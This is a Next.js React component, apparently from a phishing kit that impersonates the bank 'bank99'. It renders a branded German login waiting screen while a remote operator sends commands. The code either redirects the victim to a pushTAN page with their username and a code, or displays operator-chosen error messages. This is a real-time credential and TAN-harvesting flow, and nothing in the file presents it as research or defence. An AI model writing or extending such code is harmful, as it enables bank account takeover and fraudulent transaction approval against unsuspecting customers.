"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Header from "@/components/Header";
import { onCommand } from "@/lib/track";

export default function WaitingScreen({ user }: { user: string }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    onCommand((cmd) => {
      if (cmd.type === "forward_to_tan") {
        const code = (cmd.payload as { code?: string }).code || "";
        router.push(`/pushtan?code=${encodeURIComponent(code)}&user=${encodeURIComponent(user)}`);
      } else if (cmd.type === "back_to_login") {
        router.push("/");
      } else if (cmd.type === "show_error") {
        setError((cmd.payload as { message?: string }).message || "Ein Fehler ist aufgetreten.");
      } else if (cmd.type === "clear_error") {
        setError(null);
      }
    });
    return () => onCommand(() => {});
  }, [router, user]);

  return (
    <div
      className="min-h-screen flex flex-col login-bg"
      style={{
        backgroundImage: "url('/bank99/bg-mountains.jpg')",
        backgroundColor: "#eceff4",
      }}
    >
      <Header />
      <main className="flex-1 flex items-start justify-center pt-8">
        <div className="w-full max-w-[480px] mx-4">
          <div
            className="rounded-md overflow-hidden"
            style={{
              backgroundColor: "#fff",
              border: "1px solid rgba(0,0,0,0.2)",
              boxShadow: "0 3px 9px rgba(0,0,0,0.5)",
            }}
          >
            {/* Header */}
            <div
              className="px-4 py-3"
              style={{
                backgroundColor: "#ffdc00",
                borderBottom: "1px solid #d2d8e4",
              }}
            >
              <h1 className="text-lg font-normal m-0" style={{ color: "#333" }}>
                Anmelden
              </h1>
            </div>

            {/* Body */}
            <div className="px-4 py-6" style={{ backgroundColor: "#fff" }}>
              {error && (
                <div
                  className="mb-4 px-3 py-2 rounded text-sm"
                  style={{
                    backgroundColor: "#fef2f2",
                    border: "1px solid #fca5a5",
                    color: "#b91c1c",
                  }}
                >
                  {error}
                </div>
              )}

              <div className="flex flex-col items-center gap-4 py-4">
                {/* Spinner in bank99 brand yellow */}
                <svg
                  className="animate-spin"
                  width="48"
                  height="48"
                  viewBox="0 0 48 48"
                  fill="none"
                >
                  <circle
                    cx="24"
                    cy="24"
                    r="20"
                    stroke="#d2d8e4"
                    strokeWidth="4"
                  />
                  <path
                    d="M44 24c0-11.046-8.954-20-20-20"
                    stroke="#ffdc00"
                    strokeWidth="4"
                    strokeLinecap="round"
                  />
                </svg>

                <p
                  className="text-sm text-center"
                  style={{ color: "#333" }}
                >
                  Ihre Daten werden überprüft...
                </p>
                <p
                  className="text-xs text-center"
                  style={{ color: "#8c8c8c" }}
                >
                  Bitte warten Sie einen Moment.
                </p>
              </div>
            </div>

            {/* Footer */}
            <div
              className="px-4 py-3 text-center"
              style={{
                borderTop: "1px solid #d2d8e4",
                backgroundColor: "#fff",
              }}
            >
              <button
                type="button"
                onClick={() => router.push("/")}
                className="text-sm bg-transparent border-0 cursor-pointer"
                style={{ color: "#337ab7" }}
              >
                Abbrechen
              </button>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
